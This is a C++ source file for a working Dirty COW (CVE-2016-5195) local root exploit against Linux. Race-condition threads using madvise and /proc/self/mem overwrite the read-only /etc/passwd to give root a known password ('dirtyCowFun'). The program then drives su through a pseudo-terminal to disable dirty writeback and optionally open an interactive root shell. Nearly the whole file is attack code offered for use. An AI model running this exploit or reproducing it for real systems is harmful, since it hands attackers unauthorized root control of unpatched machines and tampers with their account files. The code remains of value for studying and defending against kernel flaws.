// -----------------------------------------------------------------
// Copyright (C) 2017  Gabriele Bonacini
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation; either version 3 of the License, or
// (at your option) any later version.
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software Foundation,
// Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA
// -----------------------------------------------------------------

#include <iostream>
#include <fstream>
#include <string>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <pwd.h>
#include <pty.h>
#include <string.h>
#include <termios.h>
#include <sys/wait.h>
#include <signal.h>
#include <pthread.h>

#define  BUFFSIZE    1024
#define  DEFSLTIME   300000
#define  PWDFILE     "/etc/passwd"
#define  BAKFILE     "./.ssh_bak"
#define  TMPBAKFILE  "/tmp/.ssh_bak"
#define  PSM         "/proc/self/mem"
#define  ROOTID      "root:"
#define  SSHDID      "sshd:"
#define  MAXITER     300
#define  DEFPWD      "$6$P7xBAooQEZX/ham$9L7U0KJoihNgQakyfOQokDgQWLSTFZGB9LUU7T0W2kH1rtJXTzt9mG4qOoz9Njt.tIklLtLosiaeCBsZm8hND/"
#define  TXTPWD      "dirtyCowFun\n"
#define  DISABLEWB   "echo 0 > /proc/sys/vm/dirty_writeback_centisecs\n"
#define  EXITCMD     "exit\n"
#define  CPCMD       "\\cp "
#define  RMCMD       "\\rm "

using namespace std;

class Dcow{
    private:
       bool              rawMode,     opShell,     restPwd;
       int               fd,          master,      wstat;
       string            root,        user,        sshd;
       pthread_t         writerThr,   madviseThr,  checkerThr;
       ofstream          *extPwdBak;
       struct passwd     *userId;
       pid_t             child;  
       char              buffv[BUFFSIZE];
       fd_set            rfds;
       struct termios    termOld,    termNew;

       int   result(int ret, bool shell);
       void  exitOnError(string msg);
    public:
       int               iter;
       ssize_t           ign;
       bool              run;
       void              *map;
       ifstream          *extPwd;
       string            etcPwd,    etcPwdBak,   buffer,   pwd;
       Dcow(bool opSh, bool rstPwd);
       ~Dcow(void);
       int  expl(void);         
};

Dcow::Dcow(bool opSh, bool rstPwd) :  rawMode(false),   opShell(opSh),  restPwd(rstPwd),
                   wstat(0),          root(ROOTID),     sshd(SSHDID),   extPwdBak(NULL), 
                   child(0),          iter(0),          run(true),      extPwd(NULL), 
                   pwd(DEFPWD) { 
   userId = getpwuid(getuid());
   user.append(userId->pw_name).append(":");
   extPwd = new ifstream(PWDFILE);   
   while (getline(*extPwd, buffer)){
       buffer.append("\n");
       etcPwdBak.append(buffer);
       if(buffer.find(root) == 0){
          etcPwd.insert(0, root).insert(root.size(), pwd);
          etcPwd.insert(etcPwd.begin() + root.size() + pwd.size(), 
                        buffer.begin() + buffer.find(":", root.size()), buffer.end());
       }else if(buffer.find(user) == 0 ||  buffer.find(sshd) == 0 ){
          etcPwd.insert(0, buffer);
       }else{
          etcPwd.append(buffer);
       }
   }
   extPwdBak = new ofstream(restPwd ? TMPBAKFILE : BAKFILE);
   extPwdBak->write(etcPwdBak.c_str(), etcPwdBak.size());
   extPwdBak->close();
   fd = open(PWDFILE,O_RDONLY);
   map = mmap(NULL, etcPwdBak.size(), PROT_READ,MAP_PRIVATE, fd, 0);
}

Dcow::~Dcow(void){
   extPwd->close();
   close(fd);
   delete extPwd; delete extPwdBak; 
   if(rawMode)    tcsetattr(STDIN_FILENO, TCSANOW, &termOld);
   if(child != 0) wait(&wstat); 
}

void Dcow::exitOnError(string msg){
      cerr << msg << endl;
      throw new exception();
}

int Dcow::result(int ret, bool shell){ 
       string msg = shell ? "Exit.\n" : string("Root password is:   ") + TXTPWD + "Enjoy! :-)\n";
       if(ret <= MAXITER){cerr << msg; return 0;}
       else{cerr << "Exploit failed.\n"; return 1;} 
}

void* madviser(void *par){
      Dcow* obj = reinterpret_cast<Dcow*>(par);
      while(obj->run){ madvise(obj->map, obj->etcPwdBak.size(), MADV_DONTNEED);}
      return NULL;
}

void* writer(void *par){
      Dcow* obj = reinterpret_cast<Dcow*>(par);
      int fpsm = open(PSM,O_RDWR);
      while(obj->run){ lseek(fpsm, reinterpret_cast<off_t>(obj->map), SEEK_SET);
                  obj->ign = write(fpsm, obj->etcPwd.c_str(), obj->etcPwdBak.size()); 
      }
      return NULL;
}

void* checker(void *par){
     Dcow* obj = reinterpret_cast<Dcow*>(par);
     while(obj->iter <= MAXITER){
         obj->extPwd->clear();
         obj->extPwd->seekg(0, ios::beg);
         obj->buffer.assign(istreambuf_iterator<char>(*(obj->extPwd)), istreambuf_iterator<char>());
         if(obj->buffer.find(obj->pwd) != string::npos && obj->buffer.size() >= obj->etcPwdBak.size()){
             obj->run = false; 
             break;
         }
         obj->iter ++; 
         usleep(DEFSLTIME);
     }
     obj->run = false;
     return NULL;
}

int  Dcow::expl(void){

  if(pthread_create(&madviseThr, NULL, madviser, reinterpret_cast<void*>(this)) != 0){
      cerr << "Can't create madviser thread"  << endl;
      throw new exception();
  }
  if(pthread_create(&writerThr,  NULL, writer,   reinterpret_cast<void*>(this)) != 0){
      cerr << "Can't create writer thread"  << endl;
      throw new exception();
  }
  if(pthread_create(&checkerThr, NULL, checker, reinterpret_cast<void*>(this)) != 0){
      cerr << "Can't create checker thread"  << endl;
      throw new exception();
  }

  cerr << "Running ..." << endl;
  pthread_join(madviseThr, NULL);
  pthread_join(writerThr,  NULL);
  pthread_join(checkerThr, NULL);

  if(iter <= MAXITER){ 
       child = forkpty(&master, NULL, NULL, NULL);

       if(child == -1) exitOnError("Error forking pty.");

       if(child == 0){ 
          execlp("su", "su", "-", NULL);
          exitOnError("Error on exec.");
       }

       if(opShell) cerr << "Password overridden to: " <<  TXTPWD << endl;
       memset(buffv, 0, BUFFSIZE);
       ssize_t bytes_read = read(master, buffv, BUFFSIZE - 1);
       if(bytes_read <= 0) exitOnError("Error reading  su prompt.");
       cerr << "Received su prompt (" << buffv << ")" << endl; 

       if(write(master, TXTPWD, strlen(TXTPWD)) <= 0) 
            exitOnError("Error writing pwd on tty.");

       if(write(master, DISABLEWB, strlen(DISABLEWB)) <= 0) 
            exitOnError("Error writing cmd on tty.");

       if(!opShell){
            if(write(master, EXITCMD, strlen(EXITCMD)) <= 0) 
                 exitOnError("Error writing exit cmd on tty.");
       }else{
           if(restPwd){
               string restoreCmd = string(CPCMD).append(TMPBAKFILE).append(" ").append(PWDFILE).append("\n");
               if(write(master, restoreCmd.c_str(), restoreCmd.size()) <= 0) 
                    exitOnError("Error writing restore cmd on tty.");
               restoreCmd        = string(RMCMD).append(TMPBAKFILE).append("\n");
               if(write(master, restoreCmd.c_str(), restoreCmd.size()) <= 0) 
                    exitOnError("Error writing restore cmd (rm) on tty.");
           }

           if(tcgetattr(STDIN_FILENO, &termOld) == -1 )
                exitOnError("Error getting terminal attributes.");
    
           termNew               = termOld;
           termNew.c_lflag       &= static_cast<unsigned long>(~(ICANON | ECHO));
    
           if(tcsetattr(STDIN_FILENO, TCSANOW, &termNew) == -1)
                exitOnError("Error setting terminal in non-canonical mode.");
           rawMode = true;
    
           while(true){
                FD_ZERO(&rfds);
                FD_SET(master, &rfds);
                FD_SET(STDIN_FILENO, &rfds);
    
                if(select(master + 1, &rfds, NULL, NULL, NULL) < 0 )
                    exitOnError("Error on select tty.");
    
                if(FD_ISSET(master, &rfds)) {
                    memset(buffv, 0, BUFFSIZE);
                    bytes_read = read(master, buffv, BUFFSIZE - 1);
                    if(bytes_read <= 0) break;
                    if(write(STDOUT_FILENO, buffv, bytes_read) != bytes_read)
                          exitOnError("Error writing on stdout.");
                }
    
                if(FD_ISSET(STDIN_FILENO, &rfds)) {
                    memset(buffv, 0, BUFFSIZE);
                    bytes_read = read(STDIN_FILENO, buffv, BUFFSIZE - 1);
                    if(bytes_read <= 0) exitOnError("Error reading from stdin.");
                    if(write(master, buffv, bytes_read) != bytes_read) break;
                }
            }
      }
  }

  return result(iter, opShell); 
}

void printInfo(char* cmd){
      cerr << cmd << " [-s] [-n] | [-h]\n" << endl;
      cerr << " -s  open directly a shell, if the exploit is successful;" << endl;
      cerr << " -n  combined with -s, doesn't restore the passwd file." << endl;
      cerr << " -h  print this synopsis;" << endl;
      cerr << "\n If no param is specified, the program modifies the passwd file and exits." << endl;
      cerr << " A copy of the passwd file will be create in the current directory as .ssh_bak" << endl;
      cerr << " (unprivileged user), if no parameter or -n is specified.\n" << endl;
      exit(1);
}

int main(int argc, char** argv){
   const char  flags[]   = "shn";
   int         c;
   bool        opShell   = false,
               restPwd   = argc != 1 ? true : false;

   opterr = 0;
   while ((c = getopt(argc, argv, flags)) != -1){
      switch (c){
         case 's':
            opShell = true;
         break;
         case 'n':
            restPwd = false;
         break;
         case 'h':
            printInfo(argv[0]);
         break;
         default:
            cerr << "Invalid parameter." << endl << endl;
            printInfo(argv[0]);
      }
   }

   if(!restPwd && !opShell && argc != 1){
            cerr << "Invalid parameter: -n requires -s" << endl << endl;
            printInfo(argv[0]);
   }

   Dcow dcow(opShell, restPwd);
   return dcow.expl();
}
